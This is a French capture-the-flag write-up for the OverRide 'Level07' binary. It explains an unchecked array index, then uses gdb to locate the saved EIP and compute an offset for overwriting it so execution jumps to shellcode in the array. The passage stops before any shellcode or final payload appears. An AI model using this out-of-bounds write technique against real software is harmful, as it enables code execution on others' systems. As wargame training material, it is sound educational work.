## Level07

On observe que le binaire nous permet de stocker un nombre a un certain index, et d'afficher le contenu du tableau pour un index donné.

Lorsque qu'on entre un index qui est divisible par 3, nous obtenons un message d'erreur:

![image](https://user-images.githubusercontent.com/29956389/95601346-9bf4b100-0a53-11eb-8b10-d557af6084f4.png)

Le binaire éfface les argument passé, ainsi que l'environement, mais nous laisse avec une stack executable.

```
while (av[i] != 0)
{
	memset(av[i], 0, strlen(av[i]));
	i++;
}
i = 0;
while (env[i] != 0)
{
	memset(env[i], 0, strlen(env[i]));
	i++;
}
```

Une fois le code désassemblé, on observe que le tableau qui stocke les nombres a 100 index: `char	database[100];`, mais aucune vérification est faite sur l'index que nous donnons, nous pouvons donc en theorie écrire ou nous voulons.

On peut donc stocker notre shellcode directement dans le tableau, et réécrire l'eip pour qu'il pointe sur notre shellcode.

Avec la structure du code, on tente donc de trouver l'eip stocké lors de l'appel a main:

```
level07@OverRide:~$ gdb -q ./level07 
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb) b *main
Breakpoint 1 at 0x8048723
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048723 in main ()
(gdb) i f
Stack level 0, frame at 0xffffd710:
 eip = 0x8048723 in main; saved eip 0xf7e45513
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffd710
 Saved registers:
  eip at 0xffffd70c   <--- EIP
```

Maintenant il faut trouver l'adresse du tableau pour en dériver l'index que nous utiliserons pour réécrire l'eip:

Pour cela on peut directement afficher l'adresse `[esp+0x24]` a `main+110`, le problème est que gdb modifie les variables d'environement, ce qui entraine une variation dans les adresses de la stack. On aura donc bien du mal a trouver l'adresse lorsque nous somme pas dans GDB.

La solution ici, est d'utiliser la fonction `read_number` pour trouver la différence relative entre l'adresse effective du tableau, et l'adresse du tableau passé en argument a la fonction `read_number`: Cette différence ne changera pas lors d'ajout ou de retrait de variable d'environement.

Lors de l'appel a `read_number`, le tableau sera stocké a `ebp+0x8`: EBP est le debut de notre stackframe, `ebp+0x4` est l'eip enregistré, et `ebp+0x8` est le tableau logiquement.

```
(gdb) b *read_number+6
(gdb) r
[...]
(gdb) x $ebp+0x8
0xffffd520:     0xffffd544
```

`0xffffd520` est l'adresse pour l'argument de la fonction, et `0xffffd544` est l'adresse réélle du tableau.

```
(gdb) p 0xffffd544 - 0xffffd520
$2 = 36
(gdb) p 36 / 4  <-- 4 parce que tableau de int
$3 = 9
```

On obtiens l'index 9. N'oublions pas que la stack grandis vers des addresse plus petites, l'index `9` est en fait `-9`, ce qui fera wrapper l'int a `4294956356` soit `0xFFFFD544`: notre tableau.






